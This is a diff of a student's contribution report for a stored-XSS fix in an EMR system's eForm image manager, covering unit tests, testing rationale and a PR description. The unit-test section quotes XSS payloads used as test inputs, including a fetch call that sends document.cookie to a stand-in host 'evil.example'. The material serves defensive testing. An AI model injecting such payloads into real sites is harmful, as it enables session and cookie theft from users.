@@ -4,7 +4,7 @@
 **Contribution Number:** [1]  
 **Student:** [Raymond Lin]  
 **Issue:** [GitHub issue link](https://github.com/carlos-emr/carlos/issues/2316)  
-**Status:** Phase I — Completed · Phase II — Completed
+**Status:** Phase I — Completed · Phase II — Completed · Phase III — Completed · Phase IV — Completed
 
 ---
 
@@ -206,14 +206,38 @@ Using UMPIRE framework (adapted):
 
 ### Unit Tests
 
-- [ ] Test case 1: [Description]
-- [ ] Test case 2: [Description]
-- [ ] Test case 3: [Description]
+Three JUnit tests in `EformImageFilenameEncodingUnitTest.java` lock in the encoding contract — one per sink/context. Payloads are deliberately different from the ones used in manual reproduction, to widen coverage:
+
+- [x] **Test case 1 — `htmlAttribute` context (line 100, `title`):** encoding `"><script>alert(1)</script>` with `SafeEncode.forHtmlAttribute()` escapes both the `"` (→ `&#34;`) and the `<` (→ `&lt;`), so a filename can neither close the `title=""` attribute nor open a new tag.
+- [x] **Test case 2 — `javaScriptAttribute` context (line 102, `onclick`):** encoding `';fetch('//evil.example/?c='+document.cookie);//` with `SafeEncode.forJavaScriptAttribute()` escapes the single quote to `\x27`, so the payload can't close the `showImage('…')` JS string and run injected statements.
+- [x] **Test case 3 — `html` context (line 102, link text):** encoding `<svg onload=alert(document.domain)>` with `SafeEncode.forHtmlContent()` escapes `<`/`>` (→ `&lt;`/`&gt;`), so no real element is injected into the page body.
+
+**How to run them** (from the repo root inside the container):
+```bash
+cd /workspace
+mvn -o test -Dtest=EformImageFilenameEncodingUnitTest
+```
+- `mvn test` — compiles the code, then runs the matching tests.
+- `-o` — offline mode; skips checking the internet for dependency updates so it starts faster.
+- `-Dtest=EformImageFilenameEncodingUnitTest` — runs only this test class instead of the whole suite.
+
+Expected output near the end:
+```
+Tests run: 3, Failures: 0, Errors: 0, Skipped: 0
+[INFO] BUILD SUCCESS
+```
+`Failures: 0` means the encoding behaves correctly; a failure prints the expected-vs-actual assertion pointing at the exact line. (On this WSL/9p filesystem the compile step takes a few minutes — that's the environment, not the tests; the 3 tests themselves run in milliseconds.) Other run options: `mvn -o test -Dgroups="encoding"` or `-Dgroups="security"` run everything with those tags, and `make install --run-unit-tests` builds and runs the whole unit-test suite.
 
 ### Integration Tests
 
-- [ ] Integration scenario 1
-- [ ] Integration scenario 2
+**Not applicable for this fix — verification is end-to-end/browser instead.** In this project, JUnit integration tests extend `CarlosTestBase` (Spring context + H2 in-memory database) and exercise the DAO / Manager / DB layers; they do not render JSPs. This change lives entirely in the JSP **view layer** (output encoding of a string), so there's no database or service behavior for a `CarlosTestBase` test to assert against — forcing one would be testing the wrong layer.
+
+The real "everything connected" coverage for a JSP/XSS fix is **end-to-end in a browser**, which is exactly the [Manual Testing](#manual-testing) below (load the page, confirm no alert fires, confirm View Page Source shows escaped entities). The project automates this class of check with Playwright UI tests (`scripts/*-playwright*.js`); an optional automated version of scenario 1 could be modeled on those:
+
+- **Scenario 1 (XSS blocked):** with a malicious-named file in the eform image dir, load `/carlos/eform/efmimagemanager` as a logged-in user → no alert fires on hover/click/render, and the rendered HTML shows the filename encoded (`&#34;`, `&lt;`, `\x27`).
+- **Scenario 2 (no regression):** with a normal filename (e.g. `scan.png`), the Image Library still renders, the view-image link opens, and Delete works — confirming the encoding didn't break legitimate behavior.
+
+> **Summary:** unit tests cover the encoding contract; integration is end-to-end/browser verification (manual now, optionally Playwright later), since the change is in the JSP view layer and is not exercisable through the DB-backed `CarlosTestBase` integration harness.
 
 ### Manual Testing
 
@@ -295,15 +319,43 @@ https://github.com/user-attachments/assets/9acc8059-c5c7-4f65-8e77-885b09e88793
 
 ## Pull Request
 
-**PR Link:** [GitHub PR URL when submitted]
+**PR Link:** https://github.com/carlos-emr/carlos/pull/2896
 
-**PR Description:** [Draft or final PR description - much of the content above can be adapted]
+**PR Description** (draft — ready to paste when opening the PR):
+
+> ## What does this PR do?
+>
+> Adds context-specific output encoding to the three locations in `eform/efmimagemanager.jsp` where an image filename is rendered into the page, using the project's null-safe `<carlos:encode>` tag. This hardens the eForm Image Library against stored XSS as a defense-in-depth measure.
+>
+> ## Why was this PR needed?
+>
+> The image filename (`curimage` / `fileURL`, sourced from `EFormUtil.listImages()`) was written into three output contexts with no encoding:
+> - **Line 100** — the `title=""` HTML attribute
+> - **Line 102** — the `showImage('<%=fileURL%>', ...)` `onclick` JavaScript string
+> - **Line 102** — the link text / HTML body
+>
+> Today these are not exploitable through the UI because `PathValidationUtils.validateFileName()` strips everything outside `[a-zA-Z0-9._]` at upload. But that is a single input-sanitization layer; if it is ever weakened, bypassed, or a new upload path skips it, all three locations become live XSS sinks. By planting malicious filenames directly on disk (bypassing upload validation, exercising only the render path) I confirmed all three execute `alert(document.domain)` — via hover (`title`), click (`onclick`), and automatic render (`<img onerror>` in the body). Line 107's `deleteImg()` already encodes `curimage` correctly, so this PR simply makes the other three sinks consistent with that existing pattern.
+>
+> ## What are the relevant issue numbers?
+>
+> Closes #2316
+>
+> ## Screenshots / Recordings
+>
+> Before/after: each payload fires an `alert` before the fix and is rendered as inert, escaped text after. (Reproduction recording and screenshots available.)
+>
+> ## Does this PR meet the acceptance criteria?
+>
+> - [x] Tests added for new/changed behavior (`EformImageFilenameEncodingUnitTest` — one per encoding context)
+> - [x] All tests passing
+> - [x] Follows project style guide (uses the mandated null-safe `<carlos:encode>` wrapper; Conventional Commits + DCO sign-off)
+> - [x] No breaking changes introduced (legitimate filenames render and function unchanged)
+> - [x] Documentation updated (if applicable) — N/A; view-layer encoding only
 
 **Maintainer Feedback:**
-- [Date]: [Summary of feedback received]
-- [Date]: [How you addressed it]
+- _(none yet — awaiting first review)_
 
-**Status:** [Awaiting review / Iterating / Approved / Merged]
+**Status:** Awaiting review
 
 ---
 
